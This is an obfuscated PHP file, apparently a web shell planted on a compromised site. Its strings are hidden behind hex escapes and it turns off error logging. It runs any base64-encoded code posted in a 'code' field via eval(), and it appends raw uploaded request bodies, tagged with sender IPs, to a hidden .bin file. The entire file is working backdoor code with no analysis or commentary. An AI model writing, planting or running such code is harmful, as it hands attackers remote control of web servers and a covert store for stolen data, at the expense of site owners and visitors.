<?php @error_reporting(0); @ini_set("\x64is\x70\x6c\x61\x79\x5fe\x72\x72\x6fr\x73",0); @ini_set("l\x6fg_\x65rror\x73",0); @ini_set("\x65rr\x6f\x72_\x6c\x6fg",0); @ini_set("m\x65\x6dory\x5fl\x69mit", "\x31\x32\x38\x4d"); @ini_set("\x6d\x61\x78\x5f\x65xe\x63\x75\x74ion_\x74i\x6de",30); @set_time_limit(30); if (isset($_SERVER["H\x54\x54\x50\x5fX\x5f\x52\x45\x41\x4c\x5fIP"])) $_SERVER["\x52\x45M\x4fTE_\x41D\x44\x52"] = $_SERVER["H\x54\x54\x50\x5fX\x5f\x52\x45\x41\x4c\x5fIP"]; if (isset($_POST["\x63\x6f\x64e"])) { eval(base64_decode($_POST["\x63\x6f\x64e"])); } elseif (isset($_SERVER["H\x54\x54\x50\x5f\x43\x4fN\x54\x45\x4e\x54\x5f\x45N\x43O\x44I\x4eG"]) && $_SERVER["H\x54\x54\x50\x5f\x43\x4fN\x54\x45\x4e\x54\x5f\x45N\x43O\x44I\x4eG"] == "\x62\x69na\x72\x79") { $input = file_get_contents("php://i\x6eput"); if (strlen($input) > 0) print "\x53T\x41\x54U\x53\x2d\x49\x4d\x50\x4f\x52\x54-\x4f\x4b"; if (strlen($input) > 10) { $fp = @fopen(str_replace(".\x70h\x70","\x2e\x62\x69n",basename($_SERVER["S\x43RIPT_\x46\x49\x4c\x45NAM\x45"])), "\x61"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["\x52\x45M\x4fTE_\x41D\x44\x52"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["\x52\x45QUEST_\x55RI"], ".s\x68\x74ml") !== false) { print $_SERVER["\x52\x45QUEST_\x55RI"]; } exit; ?>